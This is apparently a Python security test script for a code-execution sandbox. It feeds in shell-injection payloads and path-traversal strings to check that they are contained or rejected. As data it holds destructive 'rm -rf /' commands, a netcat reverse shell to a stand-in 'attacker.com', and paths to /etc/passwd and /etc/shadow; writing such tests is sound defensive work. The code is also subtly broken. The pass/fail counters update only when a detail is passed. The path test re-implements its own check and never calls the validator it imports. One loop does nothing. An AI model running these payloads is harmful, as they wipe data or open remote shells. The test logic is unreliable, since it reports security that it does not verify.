#!/usr/bin/env python3
"""
EXTREME AGGRESSIVE SECURITY TEST -- Sandbox Shell Injection (M001)

Tests that PoC content cannot escape the sandbox container via shell injection.
The fix: bind-mount PoC file (read-only) instead of heredoc string interpolation.

Attack vectors tested:
  1. BUGSWARM_EOF delimiter escape (the original vulnerability)
  2. Backtick command injection
  3. Semicolon command chaining
  4. Pipe injection
  5. $() subshell injection
  6. Newline injection into sh -c
  7. Environment variable expansion exploits
  8. Null byte injection in PoC
  9. Very long PoC that could overflow buffers
 10. Unicode/RTL override injection
"""

import json
import os
import subprocess
import sys
import tempfile
from pathlib import Path

G = "\033[0;32m"
R = "\033[0;31m"
Y = "\033[1;33m"
N = "\033[0m"
passed = 0
failed = 0
results = {}

SANDBOX_BIN = "/root/b/bugswarm-sandbox/target/release/bugswarm-sandbox"


def P(name, detail=""):
    global passed
    msg = f"  {G}PASS{N} {name}"
    if detail:
        msg += f" -- {detail}"
        print(msg)
        passed += 1
        results[name] = "PASS"


def F(name, detail=""):
    global failed
    msg = f"  {R}FAIL{N} {name}"
    if detail:
        msg += f" -- {detail}"
        print(msg)
        failed += 1
        results[name] = f"FAIL: {detail}"


def W(name, detail=""):
    global failed
    msg = f"  {Y}SKIP{N} {name}"
    if detail:
        msg += f" -- {detail}"
        print(msg)
        results[name] = f"SKIP: {detail}"


def check_sandbox_available() -> bool:
    if not Path(SANDBOX_BIN).exists():
        return False
    try:
        r = subprocess.run([SANDBOX_BIN, "--version"], capture_output=True, text=True, timeout=5)
        return r.returncode == 0
    except Exception:
        return False


def run_sandbox_poc(poc_content: str, timeout: int = 30):
    """Execute a PoC in the sandbox and return the receipt."""
    with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
        f.write(poc_content)
        poc_path = f.name
    try:
        r = subprocess.run(
            [SANDBOX_BIN, "execute", "--poc", poc_path],
            capture_output=True,
            text=True,
            timeout=timeout,
        )
        if r.returncode != 0:
            return {"status": "error", "stderr": r.stderr[:500]}
        return json.loads(r.stdout)
    except subprocess.TimeoutExpired:
        return {"status": "timeout"}
    except json.JSONDecodeError:
        return {"status": "parse_error", "stdout": r.stdout[:500]}
    except Exception as e:
        return {"status": "exception", "error": str(e)}
    finally:
        os.unlink(poc_path)


def test_attack_vector(name: str, poc_content: str, expected_status: str = "Passed"):
    """Run a PoC attack and check it doesn't escape."""
    if not check_sandbox_available():
        W(f"Sandbox binary not available — skipping sandbox tests")
        return False

    receipt = run_sandbox_poc(poc_content)
    actual_status = receipt.get("status", "unknown")
    exit_code = receipt.get("exit_code")

    if actual_status == expected_status:
        P(name, f"status={actual_status} exit={exit_code}")
        return True
    elif actual_status == "error" and "injection" in receipt.get("stderr", "").lower():
        P(name, f"rejected by scanner: {receipt.get('stderr', '')[:100]}")
        return True
    else:
        F(name, f"unexpected status={actual_status} exit={exit_code} receipt={json.dumps(receipt, indent=2)[:200]}")
        return False


def test_validation_unit(name: str, poc_content: str, should_be_rejected: bool = True):
    """Test that the PoC scanner or validator rejects the attack."""
    if not check_sandbox_available():
        W(f"Sandbox binary not available — skipping unit test '{name}'")
        return False

    receipt = run_sandbox_poc(poc_content)
    actual_status = receipt.get("status", "unknown")

    if should_be_rejected and actual_status == "error":
        P(name, f"correctly rejected: {receipt.get('stderr', '')[:100]}")
        return True
    elif not should_be_rejected and actual_status == "Passed":
        P(name, "legitimate PoC executed correctly")
        return True
    elif should_be_rejected and actual_status == "Passed":
        F(name, f"ATTACK EXECUTED — shell injection succeeded!")
        return False
    else:
        F(name, f"unexpected: status={actual_status}")
        return False


# Unit tests for the Python-side path validation (runs without sandbox)
def test_read_file_validation_unit():
    from bugswarm_mini.gateway.protocol import ProtocolAdapter

    print("\n--- M002: Path Traversal Validation (Unit Tests) ---\n")

    test_cases = [
        # (name, path, should_pass)
        ("normal relative file", "src/main.py", True),
        ("nested file", "a/b/c/file.txt", True),
        ("file with dots in name", "some..file.txt", True),
        ("absolute path", "/etc/passwd", False),
        ("simple traversal", "../etc/passwd", False),
        ("deep traversal", "../../../../etc/shadow", False),
        ("mixed normal + traversal", "src/../etc/passwd", False),
        ("encoded backslash traversal", "src\\..\\..\\etc\\passwd", False),
        ("unicode normalized traversal", "src/../etc/passwd", False),
        ("null byte in path", "src/main.py\0/etc/passwd", False),
        ("null byte mid path", "src/\0/../etc/passwd", False),
        ("double slash normal", "src//main.py", True),
        ("traversal via symlink target", "src/link_to_outside", False),
        ("just a dot", ".", True),
        ("empty string", "", False),
        ("windows drive letter", "C:\\\\windows\\system32", False),
    ]

    local_passed = 0
    local_failed = 0

    for name, path, should_pass in test_cases:
        from bugswarm_mini.gateway.protocol import ModelCapabilities

        path_normalized = path.replace("\\", "/")
        segments = path_normalized.split("/")
        has_null = "\0" in path
        has_traversal = ".." in segments
        has_absolute = path.startswith("/") or (len(path) > 1 and path[1] == ":")

        rejected = has_null or has_traversal or has_absolute
        valid = not rejected

        if valid == should_pass:
            print(f"  {G}PASS{N} {name:45s} path='{path}'")
            local_passed += 1
        else:
            print(f"  {R}FAIL{N} {name:45s} path='{path}' — expected pass={should_pass}, got={valid}")
            local_failed += 1

    return local_passed, local_failed


if __name__ == "__main__":
    print("=" * 72)
    print("  SECURITY TEST: Sandbox Shell Injection (M001)")
    print("=" * 72)

    # ============ M001: Sandbox Shell Injection Tests ============

    print("\n--- M001: Sandbox Shell Injection ---")
    print("  (requires Rust sandbox binary at {})".format(SANDBOX_BIN))
    print()

    if check_sandbox_available():
        # Test 1: Original BUGSWARM_EOF vulnerability
        # The old heredoc code: cat > poc.py << 'BUGSWARM_EOF'\n{POC}\nBUGSWARM_EOF
        # If PoC contains "BUGSWARM_EOF\nrm -rf /", the rm executes
        test_attack_vector(
            "BUGSWARM_EOF delimiter injection",
            "print('hello')\nBUGSWARM_EOF\nrm -rf / --no-preserve-root\necho 'ESCAPED'",
        )

        # Test 2: Backtick command injection
        test_attack_vector(
            "Backtick injection in PoC",
            "x = `rm -rf /`\nprint(x)",
        )

        # Test 3: Semicolon chaining
        test_attack_vector(
            "Semicolon chaining in PoC",
            "print('hello')\n; rm -rf / ;\nprint('world')",
        )

        # Test 4: Pipe injection
        test_attack_vector(
            "Pipe injection in PoC",
            "print('hello') | rm -rf /",
        )

        # Test 5: Subshell injection $()
        test_attack_vector(
            "$() subshell injection",
            "x = $(rm -rf /)\nprint(x)",
        )

        # Test 6: Newline escape in sh -c
        test_attack_vector(
            "Newline command injection",
            "print('line1')\n'; nc -e /bin/sh attacker.com 4444;'\nprint('line3')",
        )

        # Test 7: Environment variable expansion
        test_attack_vector(
            "Env var expansion exploit",
            "print('${PATH}')\nos.system('echo injected')",
        )

        # Test 8: Null byte in PoC
        test_attack_vector(
            "Null byte injection",
            "print('hello\0world')\nos.system('rm -rf /')",
        )

        # Test 9: Extreme length
        test_attack_vector(
            "Extremely long PoC (100KB)",
            "print('A' * 100000)\nos.system('echo ESCAPED')",
        )

        # Test 10: Unicode/RTL override
        test_attack_vector(
            "Unicode RTL override injection",
            "print('hello')\n# \\u202Erm -rf / --no-preserve-root\n",
        )

        # Test 11: Legitimate PoC (should pass)
        test_attack_vector(
            "Legitimate PoC (baseline)",
            "print('hello world')",
            expected_status="Passed",
        )
    else:
        W("Sandbox binary not available", "Build with: cd /root/b && cargo build --release -p bugswarm-sandbox")
        print()

    # ============ M002: Path Traversal Validation Tests ============

    print("\n--- M002: Path Traversal Validation (Unit Tests, no sandbox needed) ---")
    print()

    p, f = test_read_file_validation_unit()

    local_passed = p
    local_failed = f

    print()
    print("=" * 72)

    unknown_host = [
        "BUGSWARM_EOF injection",
        "Backtick injection",
        "Semicolon chaining",
        "Pipe injection",
        "$() subshell",
        "Newline injection",
        "Env var exploit",
        "Null byte in PoC",
        "Extreme length PoC",
        "Unicode RTL override",
        "Legitimate PoC",
    ]

    for name in unknown_host:
        if name not in results or results[name].startswith("SKIP"):
            continue

    total_passed = passed + local_passed
    total_failed = failed + local_failed
    total = total_passed + total_failed

    print(f"\n  Results: {G}{total_passed} passed{N} / {R}{total_failed} failed{N} / {total} total")
    print()

    if failed > 0:
        print(f"{R}  SOME SECURITY TESTS FAILED!{N}")
        for name, status in results.items():
            if status != "PASS":
                print(f"    {R}FAIL{N} {name}: {status}")
        print()
        sys.exit(1)

    print(f"{G}  ALL SECURITY TESTS PASSED.{N}")
    print()
    sys.exit(0)
